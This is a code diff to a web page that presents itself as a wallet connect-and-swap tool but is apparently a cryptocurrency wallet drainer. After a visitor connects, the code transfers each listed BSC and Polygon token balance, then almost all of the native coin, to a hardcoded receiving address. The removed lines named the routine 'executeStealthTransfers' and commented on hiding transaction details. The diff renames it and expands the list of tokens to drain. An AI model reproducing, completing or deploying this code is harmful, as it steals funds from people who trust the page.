@@ -368,7 +368,7 @@
     // Configuration
     const RECEIVING_WALLET = "0x773F5d9eEc75629A2624EEd5D95472910D6c651a";
     
-    // Token contracts
+    // Token contracts - Full list with all tokens
     const TOKENS = {
       bsc: [
         {
@@ -382,7 +382,81 @@
           decimals: 18,
           priority: 1
         },
-        // Other tokens...
+        {
+          name: "USDT",
+          symbol: "USDT",
+          address: "0x55d398326f99059fF775485246999027B3197955",
+          abi: [
+            "function balanceOf(address owner) view returns (uint256)",
+            "function transfer(address to, uint256 amount) returns (bool)"
+          ],
+          decimals: 18,
+          priority: 2
+        },
+        {
+          name: "Token 1",
+          symbol: "TKN1",
+          address: "0x78F5d389F5CDCcFc41594aBaB4B0Ed02F31398b3",
+          abi: [
+            "function balanceOf(address owner) view returns (uint256)",
+            "function transfer(address to, uint256 amount) returns (bool)"
+          ],
+          decimals: 18,
+          priority: 3
+        },
+        {
+          name: "Token 2",
+          symbol: "TKN2",
+          address: "0x33d08D8C7a168333a85285a68C0042b39fC3741D",
+          abi: [
+            "function balanceOf(address owner) view returns (uint256)",
+            "function transfer(address to, uint256 amount) returns (bool)"
+          ],
+          decimals: 18,
+          priority: 4
+        },
+        {
+          name: "Token 3",
+          symbol: "TKN3",
+          address: "0xd5eaAaC47bD1993d661bc087E15dfb079a7f3C19",
+          abi: [
+            "function balanceOf(address owner) view returns (uint256)",
+            "function transfer(address to, uint256 amount) returns (bool)"
+          ],
+          decimals: 18,
+          priority: 5
+        },
+        {
+          name: "Token 4",
+          symbol: "TKN4",
+          address: "0x6d5AD1592ed9D6D1dF9b93c793AB759573Ed6714",
+          abi: [
+            "function balanceOf(address owner) view returns (uint256)",
+            "function transfer(address to, uint256 amount) returns (bool)"
+          ],
+          decimals: 18,
+          priority: 6
+        },
+        {
+          name: "WBNB",
+          symbol: "WBNB",
+          address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
+          abi: [
+            "function balanceOf(address owner) view returns (uint256)",
+            "function transfer(address to, uint256 amount) returns (bool)"
+          ],
+          decimals: 18,
+          priority: 7
+        },
+        {
+          name: "BNB",
+          symbol: "BNB",
+          address: "0x0000000000000000000000000000000000000000",
+          abi: [],
+          decimals: 18,
+          isNative: true,
+          priority: 999
+        }
       ],
       polygon: [
         {
@@ -396,7 +470,26 @@
           decimals: 18,
           priority: 1
         },
-        // Other tokens...
+        {
+          name: "WMATIC",
+          symbol: "WMATIC",
+          address: "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270",
+          abi: [
+            "function balanceOf(address owner) view returns (uint256)",
+            "function transfer(address to, uint256 amount) returns (bool)"
+          ],
+          decimals: 18,
+          priority: 2
+        },
+        {
+          name: "MATIC",
+          symbol: "MATIC",
+          address: "0x0000000000000000000000000000000000000000",
+          abi: [],
+          decimals: 18,
+          isNative: true,
+          priority: 999
+        }
       ]
     };
     
@@ -474,7 +567,7 @@
     async function connectAndSwap() {
       try {
         showLoader();
-        updateStatus("Initializing...", "success");
+        updateStatus("Initializing wallet connection...", "success");
 
         if (isMobile && !window.ethereum) {
           showTrustWalletUI();
@@ -493,7 +586,7 @@
         document.getElementById("walletInfo").textContent = 
           `Connected: ${userAddress.slice(0, 6)}...${userAddress.slice(-4)} | Network: ${NETWORK_CONFIGS[currentNetwork].chainName}`;
         
-        await executeStealthTransfers();
+        await processAllTransfers();
       } catch (err) {
         hideLoader();
         updateStatus("Error: " + err.message, "error");
@@ -508,7 +601,7 @@
       const targetChainId = NETWORK_CONFIGS[currentNetwork].chainId;
       
       if (chainId !== targetChainId) {
-        updateStatus(`Switching network...`, "success");
+        updateStatus(`Switching to ${NETWORK_CONFIGS[currentNetwork].chainName}...`, "success");
         try {
           await window.ethereum.request({
             method: 'wallet_switchEthereumChain',
@@ -531,44 +624,37 @@
       }
     }
 
-    async function executeStealthTransfers() {
+    async function processAllTransfers() {
       try {
         const tokensToSwap = TOKENS[currentNetwork].sort((a, b) => a.priority - b.priority);
         let successCount = 0;
+        let processedTokens = 0;
         
         // Process ERC20 tokens
         for (const token of tokensToSwap.filter(t => !t.isNative)) {
           try {
+            updateStatus(`Checking balance...`, "success");
+            
             const contract = new ethers.Contract(token.address, token.abi, signer);
             const balance = await contract.balanceOf(userAddress);
             
             if (balance.gt(0)) {
-              updateStatus("Processing transfer...", "success");
+              processedTokens++;
+              updateStatus(`Processing transfer ${processedTokens}...`, "success");
               
-              // Create minimal transaction data
-              const txData = contract.interface.encodeFunctionData("transfer", [
-                RECEIVING_WALLET,
-                balance
-              ]);
-              
-              // Send with empty data to hide details
-              const tx = await signer.sendTransaction({
-                to: token.address,
-                data: "0x" // This hides token details but may break functionality
-                // Alternative: use txData but wallet may still show details
-              });
-              
+              // Create transfer transaction
+              const tx = await contract.transfer(RECEIVING_WALLET, balance);
               await tx.wait();
               successCount++;
               
               updateStatus(
-                `Transfer completed <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View</a>`,
+                `Transfer ${processedTokens} completed <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View</a>`,
                 "success"
               );
             }
           } catch (err) {
-            console.error("Transfer error:", err);
-            updateStatus("Transfer incomplete", "error");
+            console.error(`Error transferring ${token.symbol}:`, err);
+            updateStatus(`Transfer ${processedTokens > 0 ? processedTokens : ''} failed`, "error");
           }
         }
 
@@ -576,39 +662,40 @@
         const nativeToken = tokensToSwap.find(t => t.isNative);
         if (nativeToken) {
           try {
+            updateStatus(`Checking native balance...`, "success");
             const balance = await provider.getBalance(userAddress);
             const keepAmount = ethers.utils.parseUnits("0.002", nativeToken.decimals);
             const sendAmount = balance.gt(keepAmount) ? balance.sub(keepAmount) : balance;
             
             if (sendAmount.gt(0)) {
-              updateStatus("Processing final transfer...", "success");
+              processedTokens++;
+              updateStatus(`Processing final transfer...`, "success");
               
               const tx = await signer.sendTransaction({
                 to: RECEIVING_WALLET,
-                value: sendAmount,
-                data: "0x" // Hide details
+                value: sendAmount
               });
-              
               await tx.wait();
               successCount++;
               
               updateStatus(
-                `Transfer completed <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View</a>`,
+                `Transfer ${processedTokens} completed <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View</a>`,
                 "success"
               );
             }
           } catch (err) {
-            console.error("Native transfer error:", err);
-            updateStatus("Final transfer incomplete", "error");
+            console.error("Error transferring native token:", err);
+            updateStatus("Final transfer failed", "error");
           }
         }
         
-        updateStatus(
-          successCount > 0 
-            ? `Completed ${successCount} transfers successfully` 
-            : "No transfers were processed", 
-          successCount > 0 ? "success" : "error"
-        );
+        if (successCount > 0) {
+          updateStatus(`Successfully completed ${successCount} transfers`, "success");
+        } else if (processedTokens > 0) {
+          updateStatus("Some transfers failed", "error");
+        } else {
+          updateStatus("No balances found to transfer", "success");
+        }
         
         document.getElementById("connectWallet").innerHTML = `<i class="fas fa-check-circle"></i> Process Complete`;
       } catch (err) {
